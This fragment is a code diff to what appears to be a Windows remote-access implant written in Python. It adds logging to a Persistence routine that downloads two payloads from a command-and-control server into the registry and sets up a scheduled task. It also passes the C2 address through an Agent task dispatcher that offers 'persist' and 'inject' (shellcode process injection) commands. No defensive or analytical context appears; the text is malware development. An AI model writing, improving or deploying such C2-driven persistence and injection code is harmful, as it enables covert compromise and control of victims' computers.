                 return {{"status": "error", "message": "Only Windows supported"}}
             
+            logger.info("Downloading and storing engine (Python package)")
             if not Persistence._download_to_registry(f"{{c2_server}}//a/p", "engine", c2_server):
+                logger.error("Failed to store engine in registry")
                 return {{"status": "error", "message": "Failed to store engine in registry"}}
             
+            logger.info("Downloading and storing lube (Python script)")
             if not Persistence._download_to_registry(f"{{c2_server}}//a/d", "lube", c2_server):
+                logger.error("Failed to store lube in registry")
                 return {{"status": "error", "message": "Failed to store lube in registry"}}
             
+            logger.info("Creating scheduled task")
             task_name = Persistence._create_scheduled_task()
             if not task_name:
+                logger.error("Failed to create scheduled task")
                 return {{"status": "error", "message": "Failed to create scheduled task"}}
             
+            success_msg = "Persistence installed successfully"
+            logger.info(success_msg)
             return {{
                 "status": "success", 
-                "message": "Persistence installed",
+                "message": success_msg,
                 "registry_entries": ["engine", "lube"],
                 "task_name": task_name,
                 "extraction_path": r"%PUBLIC%\documents",
@@ -717,6 +869,7 @@ class Persistence:
         except Exception as e:
             logger.error(f"Installation failed: {{str(e)}}", exc_info=True)
             return {{"status": "error", "message": str(e)}}
+        
 
 # ======================
 # Process Injection
@@ -1308,7 +1461,7 @@ class Agent:
             
             elif task_type == "persist":
                 self._log_info("Installing persistence")
-                return Persistence.install()
+                return Persistence.install(self.config.C2_SERVER)
             
             elif task_type == "inject":
                 return ProcessInjector.inject_shellcode(
